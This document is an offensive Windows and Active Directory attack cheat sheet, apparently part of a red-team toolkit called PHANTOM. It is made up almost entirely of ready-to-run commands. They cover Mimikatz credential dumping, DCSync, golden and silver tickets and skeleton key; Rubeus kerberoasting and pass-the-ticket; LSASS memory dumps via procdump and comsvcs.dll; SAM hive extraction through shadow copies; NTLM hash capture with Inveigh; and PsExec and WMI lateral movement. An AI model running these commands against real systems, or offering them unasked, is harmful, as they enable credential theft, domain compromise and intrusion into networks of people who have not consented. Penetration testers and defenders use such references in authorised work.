# PHANTOM Tools Reference — Windows/FLARE-VM

> *"Windows attacks from Windows. Native tools, native power."*

## Active Directory Tools

### PowerView (PowerSploit)
**Source**: https://github.com/PowerShellMafia/PowerSploit

```powershell
# Import module
Import-Module .\PowerView.ps1

# Domain enumeration
Get-Domain
Get-DomainController
Get-DomainPolicy

# User enumeration
Get-DomainUser
Get-DomainUser -Identity admin
Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname

# Group enumeration
Get-DomainGroup
Get-DomainGroupMember -Identity "Domain Admins"
Get-DomainGroupMember -Identity "Enterprise Admins"

# Computer enumeration
Get-DomainComputer
Get-DomainComputer -OperatingSystem "*Server*"

# Trust enumeration
Get-DomainTrust
Get-ForestTrust

# ACL enumeration
Find-InterestingDomainAcl
Get-ObjectAcl -SamAccountName "username" -ResolveGUIDs

# Session enumeration
Get-NetSession -ComputerName $DC
Get-NetLoggedon -ComputerName $TARGET

# Find local admin access
Find-LocalAdminAccess

# User hunting
Find-DomainUserLocation
Invoke-UserHunter
```

### SharpHound
**Source**: https://github.com/BloodHoundAD/SharpHound

```powershell
# Run all collections
.\SharpHound.exe -c All

# Specific collections
.\SharpHound.exe -c DCOnly
.\SharpHound.exe -c Session
.\SharpHound.exe -c Group
.\SharpHound.exe -c LocalAdmin
.\SharpHound.exe -c Trusts

# Stealth mode
.\SharpHound.exe -c All --Stealth

# Loop collection
.\SharpHound.exe -c Session --Loop --LoopDuration 02:00:00

# Output directory
.\SharpHound.exe -c All --OutputDirectory C:\temp
```

### Rubeus
**Source**: https://github.com/GhostPack/Rubeus

```powershell
# Kerberoasting
.\Rubeus.exe kerberoast

# Kerberoast specific user
.\Rubeus.exe kerberoast /user:svc_account /outfile:hashes.txt

# AS-REP Roasting
.\Rubeus.exe asreproast

# AS-REP specific user
.\Rubeus.exe asreproast /user:asrep_user /outfile:hashes.txt

# Request TGT
.\Rubeus.exe asktgt /user:username /password:password

# Request TGT with hash
.\Rubeus.exe asktgt /user:username /rc4:NTLM_HASH

# Pass-the-Ticket
.\Rubeus.exe ptt /ticket:base64_ticket

# Overpass-the-Hash
.\Rubeus.exe asktgt /user:username /rc4:NTLM_HASH /ptt

# Dump tickets
.\Rubeus.exe dump

# List tickets
.\Rubeus.exe triage

# Renew ticket
.\Rubeus.exe renew /ticket:base64_ticket

# S4U (Constrained delegation)
.\Rubeus.exe s4u /user:svc$ /rc4:NTLM_HASH /impersonateuser:admin /msdsspn:cifs/target
```

### Mimikatz
**Source**: https://github.com/gentilkiwi/mimikatz

```powershell
# Run mimikatz
.\mimikatz.exe

# Get debug privilege
privilege::debug

# Dump credentials from LSASS
sekurlsa::logonpasswords

# Dump SAM
lsadump::sam

# Dump LSA secrets
lsadump::secrets

# DCSync
lsadump::dcsync /user:krbtgt
lsadump::dcsync /user:Administrator /domain:domain.local

# Golden Ticket
kerberos::golden /user:administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:KRBTGT_HASH /ptt

# Silver Ticket
kerberos::golden /user:administrator /domain:domain.local /sid:S-1-5-21-... /target:server.domain.local /service:cifs /rc4:SERVICE_HASH /ptt

# Pass-the-Hash
sekurlsa::pth /user:username /domain:domain.local /ntlm:NTLM_HASH

# Export tickets
sekurlsa::tickets /export

# Pass-the-Ticket
kerberos::ptt ticket.kirbi

# Skeleton Key (on DC)
misc::skeleton
```

### Certify (AD CS Attacks)
**Source**: https://github.com/GhostPack/Certify

```powershell
# Find vulnerable templates
.\Certify.exe find /vulnerable

# Request certificate
.\Certify.exe request /ca:CA-NAME /template:TemplateName

# Find CAs
.\Certify.exe cas
```

### SharpUp (Privilege Escalation)
**Source**: https://github.com/GhostPack/SharpUp

```powershell
# Run all checks
.\SharpUp.exe audit

# Specific checks
.\SharpUp.exe AlwaysInstallElevated
.\SharpUp.exe UnquotedServicePath
```

### Seatbelt (Enumeration)
**Source**: https://github.com/GhostPack/Seatbelt

```powershell
# Run all checks
.\Seatbelt.exe -group=all

# Specific groups
.\Seatbelt.exe -group=user
.\Seatbelt.exe -group=system
.\Seatbelt.exe -group=misc
```

## Network Tools

### PowerShell Network Commands

```powershell
# Port scan
function Test-Port {
    param([string]$Target, [int]$Port)
    try {
        $tcp = New-Object Net.Sockets.TcpClient
        $tcp.Connect($Target, $Port)
        $tcp.Close()
        return $true
    } catch { return $false }
}

# Quick port scan
1..1024 | ForEach-Object { if (Test-Port $TARGET $_) { Write-Host "Port $_ open" } }

# Network connections
Get-NetTCPConnection
netstat -ano

# DNS lookup
Resolve-DnsName $TARGET

# SMB shares
net share
net view \\$TARGET

# Domain info
nltest /dsgetdc:domain.local
```

### Inveigh (Responder alternative)
**Source**: https://github.com/Kevin-Robertson/Inveigh

```powershell
# Import module
Import-Module .\Inveigh.ps1

# Start capturing
Invoke-Inveigh -ConsoleOutput Y

# With WPAD
Invoke-Inveigh -WPAD Y -ConsoleOutput Y

# Get captured hashes
Get-Inveigh -NTLMv2 Y
```

## Lateral Movement

### PowerShell Remoting

```powershell
# Enable remoting
Enable-PSRemoting -Force

# Enter session
Enter-PSSession -ComputerName $TARGET -Credential $cred

# Invoke command
Invoke-Command -ComputerName $TARGET -ScriptBlock { whoami }

# With credentials
$cred = Get-Credential
Invoke-Command -ComputerName $TARGET -Credential $cred -ScriptBlock { whoami }
```

### WMI

```powershell
# Execute command via WMI
wmic /node:$TARGET process call create "cmd.exe /c whoami > C:\temp\output.txt"

# PowerShell WMI
Invoke-WmiMethod -ComputerName $TARGET -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami"
```

### PsExec (Sysinternals)

```powershell
# Execute command
.\PsExec.exe \\$TARGET -u domain\user -p password cmd.exe

# Interactive shell
.\PsExec.exe \\$TARGET -u domain\user -p password -i cmd.exe

# Run as SYSTEM
.\PsExec.exe \\$TARGET -s cmd.exe
```

## Credential Dumping

### Manual LSASS Dump

```powershell
# Using Task Manager: Right-click lsass.exe > Create dump file

# Using procdump
.\procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Using comsvcs.dll
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id lsass.dmp full
```

### SAM/SYSTEM Extraction

```powershell
# Copy SAM/SYSTEM (requires elevated)
reg save HKLM\SAM SAM
reg save HKLM\SYSTEM SYSTEM
reg save HKLM\SECURITY SECURITY

# Using vssadmin
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM SYSTEM
```

## Enumeration

### Native AD Commands

```powershell
# Domain users
net user /domain

# Domain groups
net group /domain

# Domain admins
net group "Domain Admins" /domain

# Specific user
net user username /domain

# Local admins on remote
net localgroup Administrators /domain

# Trust relationships
nltest /trusted_domains
```

### LDAP Queries

```powershell
# AD Module
Import-Module ActiveDirectory

# All users
Get-ADUser -Filter *

# Specific user
Get-ADUser -Identity username -Properties *

# All computers
Get-ADComputer -Filter *

# Domain controllers
Get-ADDomainController -Filter *

# SPN accounts (Kerberoastable)
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# AS-REP vulnerable
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}
```

## Quick Reference

```powershell
# Quick domain enum
Get-ADDomain
Get-ADUser -Filter * | Measure-Object

# Quick Kerberoast
.\Rubeus.exe kerberoast /outfile:hashes.txt

# Quick credential dump
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Quick lateral movement
Enter-PSSession -ComputerName $TARGET -Credential $cred
```
